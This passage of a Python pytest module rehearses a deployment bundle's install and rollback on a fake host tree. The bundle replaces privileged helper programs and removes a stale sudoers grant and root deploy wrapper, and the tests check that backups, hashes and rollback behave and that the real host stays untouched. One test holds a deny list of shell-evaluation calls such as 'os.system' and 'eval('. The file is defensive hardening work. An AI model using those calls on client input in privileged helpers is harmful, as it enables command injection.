    root = tmp_path / "host"
    (root / "root").mkdir(parents=True)
    _seed(root, TARGET_PREFLIGHT, canonical.stdout, 0o755)
    _seed(root, TARGET_SSHGATE, stale_gate if stale_gate else b"# stale a68 gate stand-in\n", 0o755)
    _seed(root, A68_DEPLOY, stale_deploy if stale_deploy else b"#!/bin/sh\n# a68 deploy wrapper stand-in\n", 0o755)
    _seed(root, A68_SUDOERS, SYNTHETIC_A68_SUDOERS, 0o440)
    _seed(root, KEEP_SUDOERS, SYNTHETIC_KEEP_SUDOERS, 0o440)

    substitutions = {
        "OLD_A68_SUDOERS": hashlib.sha256(SYNTHETIC_A68_SUDOERS).hexdigest(),
        "KEEP_SUDOERS_SHA": hashlib.sha256(SYNTHETIC_KEEP_SUDOERS).hexdigest(),
    }
    if stale_gate is None:
        substitutions["OLD_SSHGATE"] = hashlib.sha256(b"# stale a68 gate stand-in\n").hexdigest()
    if stale_deploy is None:
        substitutions["OLD_A68_DEPLOY"] = hashlib.sha256(
            b"#!/bin/sh\n# a68 deploy wrapper stand-in\n"
        ).hexdigest()
    return root, substitutions


def stub_bin(tmp_path, chown_fails_on=None):
    """Stubs for the two operations a rootless rehearsal cannot perform."""
    binned = tmp_path / "stub-bin"
    binned.mkdir(exist_ok=True)
    counter = binned / "chown.count"
    chown = binned / "chown"
    chown.write_text(
        "#!/bin/sh\n"
        'n=$(cat "%s" 2>/dev/null || echo 0); n=$((n+1)); echo "$n" > "%s"\n'
        'if [ -n "%s" ] && [ "$n" = "%s" ]; then echo "stub chown: forced failure" >&2; exit 1; fi\n'
        "exit 0\n" % (counter, counter, chown_fails_on or "", chown_fails_on or "")
    )
    os.chmod(chown, 0o755)
    visudo = binned / "visudo"
    visudo.write_text("#!/bin/sh\necho '/etc/sudoers: parsed OK'\nexit 0\n")
    os.chmod(visudo, 0o755)
    return binned


def render(procedure, substitutions):
    """Substitute only the digests of files a rootless rehearsal must stand in for."""
    for name, digest in substitutions.items():
        expected = 1 if ("\n%s=" % name) in procedure else 0
        procedure, count = re.subn(
            r"^%s=[0-9a-f]{64}$" % name, "%s=%s" % (name, digest), procedure, flags=re.M
        )
        assert count == expected, name
    # the reviewed candidate bytes are never stood in for
    assert MANIFEST["install"][0]["source_sha256"] in procedure or "NEW_PREFLIGHT" not in procedure
    return procedure


def run_procedure(procedure, tmp_path, root, substitutions, env=None, chown_fails_on=None):
    binned = stub_bin(tmp_path, chown_fails_on)
    environ = dict(os.environ)
    environ.update(
        HOSTROOT=str(root),
        CAND=str(CANDIDATE),
        CHOWN=str(binned / "chown"),
        VISUDO=str(binned / "visudo"),
    )
    environ.update(env or {})
    return subprocess.run(
        ["/bin/sh", "-c", render(procedure, substitutions)],
        capture_output=True, text=True, env=environ,
    )


def backup_dir_from(stdout):
    match = re.search(r"^backup_directory=(.+)$", stdout, re.M)
    assert match, stdout
    return match.group(1)


def sha256_of(path):
    return hashlib.sha256(pathlib.Path(path).read_bytes()).hexdigest()


def test_rehearsal_install_completes_and_removes_the_a68_authority(fake_host, tmp_path):
    root, substitutions = fake_host
    result = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert result.returncode == 0, result.stderr
    assert "install_complete" in result.stdout
    assert sha256_of(root / TARGET_PREFLIGHT.lstrip("/")) == MANIFEST["install"][0]["source_sha256"]
    assert sha256_of(root / TARGET_SSHGATE.lstrip("/")) == MANIFEST["install"][1]["source_sha256"]
    assert not (root / A68_SUDOERS.lstrip("/")).exists()
    assert not (root / A68_DEPLOY.lstrip("/")).exists()
    assert (root / KEEP_SUDOERS.lstrip("/")).read_bytes() == SYNTHETIC_KEEP_SUDOERS


def test_rehearsal_rollback_keeps_the_a68_authority_removed(fake_host, tmp_path):
    """F1, tested the way QA proved the defect: install, then roll back."""
    root, substitutions = fake_host
    install = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert install.returncode == 0, install.stderr
    backup = backup_dir_from(install.stdout)

    rollback = run_procedure(
        ROLLBACK_PROCEDURE, tmp_path, root, substitutions, env={"BK": backup}
    )
    assert rollback.returncode == 0, rollback.stderr
    assert "rollback_complete" in rollback.stdout
    assert sha256_of(root / TARGET_PREFLIGHT.lstrip("/")) == CANONICAL_PREFLIGHT
    # the stale a68 sudo authority and root deploy wrapper stay gone
    assert not (root / A68_SUDOERS.lstrip("/")).exists()
    assert not (root / A68_DEPLOY.lstrip("/")).exists()
    assert "a68_sudoers=absent" in rollback.stdout
    assert "a68_deploy_wrapper=absent" in rollback.stdout


def test_rehearsal_backup_set_holds_all_four_paths_path_preserving(fake_host, tmp_path):
    root, substitutions = fake_host
    install = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert install.returncode == 0, install.stderr
    backup = pathlib.Path(backup_dir_from(install.stdout))
    assert oct(stat.S_IMODE(backup.lstat().st_mode)) == "0o700"
    for rel in (TARGET_PREFLIGHT, TARGET_SSHGATE, A68_SUDOERS, A68_DEPLOY):
        assert (backup / rel.lstrip("/")).is_file(), rel
    inventory = (backup / "BACKUP.sha256").read_text()
    assert sha256_of(backup / TARGET_PREFLIGHT.lstrip("/")) == CANONICAL_PREFLIGHT
    assert CANONICAL_PREFLIGHT in inventory
    assert len(inventory.strip().splitlines()) == 4


def test_rehearsal_second_attempt_never_overwrites_a_backup_set(fake_host, tmp_path):
    """F6: the same identifier stops instead of overwriting a rollback set."""
    root, substitutions = fake_host
    first = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert first.returncode == 0, first.stderr
    backup = pathlib.Path(backup_dir_from(first.stdout))
    before = (backup / "BACKUP.sha256").read_bytes()

    second = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert second.returncode == 1
    assert "already exists" in second.stderr
    assert (backup / "BACKUP.sha256").read_bytes() == before
    assert sha256_of(backup / TARGET_PREFLIGHT.lstrip("/")) == CANONICAL_PREFLIGHT


def test_rehearsal_distinct_attempts_use_distinct_backup_directories(fake_host, tmp_path):
    root, substitutions = fake_host
    first = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "attempt-one"})
    assert first.returncode == 0, first.stderr
    rollback = run_procedure(
        ROLLBACK_PROCEDURE, tmp_path, root, substitutions, env={"BK": backup_dir_from(first.stdout)}
    )
    assert rollback.returncode == 0, rollback.stderr

    # a second attempt is only possible after the a68 removals are re-seeded,
    # which the rollback deliberately does not do, so it stops before mutating
    second = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "attempt-two"})
    assert second.returncode == 1
    assert "missing" in second.stderr
    assert backup_dir_from(second.stdout) != backup_dir_from(first.stdout)


def test_rehearsal_stops_on_unexpected_current_bytes(fake_host, tmp_path):
    root, substitutions = fake_host
    (root / TARGET_PREFLIGHT.lstrip("/")).write_bytes(b"not the canonical helper\n")
    result = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert result.returncode == 1
    assert "unexpected bytes" in result.stderr
    assert (root / A68_SUDOERS.lstrip("/")).exists(), "nothing may be removed before verification"


def test_rehearsal_abort_part_way_leaves_a_narrower_host(fake_host, tmp_path):
    """F3: fail during the second replacement, then recover with the rollback."""
    root, substitutions = fake_host
    # chown calls: 1 backup directory, 2 staged preflight, 3 staged ssh-gate
    aborted = run_procedure(
        INSTALL_PROCEDURE, tmp_path, root, substitutions,
        env={"STAMP": "rehearsal"}, chown_fails_on="3",
    )
    assert aborted.returncode != 0
    assert "install_complete" not in aborted.stdout
    assert not (root / A68_SUDOERS.lstrip("/")).exists()
    assert not (root / A68_DEPLOY.lstrip("/")).exists()
    assert sha256_of(root / TARGET_PREFLIGHT.lstrip("/")) == MANIFEST["install"][0]["source_sha256"]

    rollback = run_procedure(
        ROLLBACK_PROCEDURE, tmp_path, root, substitutions,
        env={"BK": backup_dir_from(aborted.stdout)},
    )
    assert rollback.returncode == 0, rollback.stderr
    assert sha256_of(root / TARGET_PREFLIGHT.lstrip("/")) == CANONICAL_PREFLIGHT
    assert not (root / A68_SUDOERS.lstrip("/")).exists()
    assert not (root / A68_DEPLOY.lstrip("/")).exists()


def test_rehearsal_leaves_no_cache_residue_beside_the_helpers(fake_host, tmp_path):
    root, substitutions = fake_host
    result = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert result.returncode == 0, result.stderr
    sbin = root / "usr/local/sbin"
    assert not (sbin / "__pycache__").exists()
    assert not any(path.name.endswith(".pyc") for path in sbin.iterdir())
    assert sorted(path.name for path in sbin.iterdir()) == [
        "backbond-real-agent-demo-secret-preflight",
        "backbond-real-agent-demo-ssh-gate",
    ]


def test_rehearsal_never_arms_and_never_touches_the_real_host(fake_host, tmp_path):
    root, substitutions = fake_host
    result = run_procedure(INSTALL_PROCEDURE, tmp_path, root, substitutions, env={"STAMP": "rehearsal"})
    assert result.returncode == 0, result.stderr
    assert not (root / "etc/backbond/real-agent-demo-deploy.allow").exists()
    assert not os.path.exists("/etc/backbond/real-agent-demo-deploy.allow")
    assert not os.path.exists("/opt/backbond-real-agent-demo/releases/" + D9)
    # this machine is the demo host: its real helpers must still hold the bytes
    # the candidate expects to replace, untouched by the rehearsal
    for path, pinned in ((TARGET_PREFLIGHT, CANONICAL_PREFLIGHT), (TARGET_SSHGATE, CANONICAL_GATE)):
        if os.path.exists(path):
            assert sha256_of(path) == pinned, path


# ---------------------------------------------------------------------------
# static properties of the candidate bytes
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE])
def test_fixed_interpreter_without_path_resolution(source):
    assert source.split(b"\n", 1)[0] == b"#!/usr/bin/python3"


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE])
def test_no_shell_evaluation_of_client_input(source):
    for forbidden in (b"shell=True", b"os.system", b"os.popen", b"eval(", b"/bin/sh"):
        assert forbidden not in source


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE])
def test_no_stale_a68_authority_in_the_candidate(source):
    assert A68.encode() not in source


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE])
def test_both_programs_are_pinned_to_d9(source):
    assert D9.encode() in source


def test_manifest_removes_the_stale_a68_authority():
    removed = {entry["target"]: entry["expected_sha256"] for entry in MANIFEST["remove"]}
    assert removed["/etc/sudoers.d/backbond-real-agent-demo"] == (
        "37b24501a7470ba37e2002d6f0a219c3b2222f82a6ca559fd71c3cefc73c02bf"
    )
    assert removed["/usr/local/sbin/backbond-real-agent-demo-deploy"] == (
        "956065275defd2abcc95a7d2e14d8e70ee54c10aa799578aa00602f29c9af723"
    )




def test_manifest_source_hashes_match_the_shipped_bytes():
    for entry in MANIFEST["install"]:
        actual = hashlib.sha256((CANDIDATE / entry["source"]).read_bytes()).hexdigest()
        assert actual == entry["source_sha256"], entry["source"]


def test_recorded_hashes_recompute():
    lines = (BUNDLE / "SHA256SUMS").read_text().splitlines()
    assert lines, "SHA256SUMS is empty"
    for line in lines:
        digest, name = line.split(None, 1)
        name = name.lstrip("*").strip()
        assert hashlib.sha256((BUNDLE / name).read_bytes()).hexdigest() == digest, name


def test_bundle_ships_no_generated_caches():
    shipped = [line.split(None, 1)[1].strip() for line in (BUNDLE / "SHA256SUMS").read_text().splitlines()]
    for name in shipped:
        assert "__pycache__" not in name
        assert not name.endswith(".pyc")
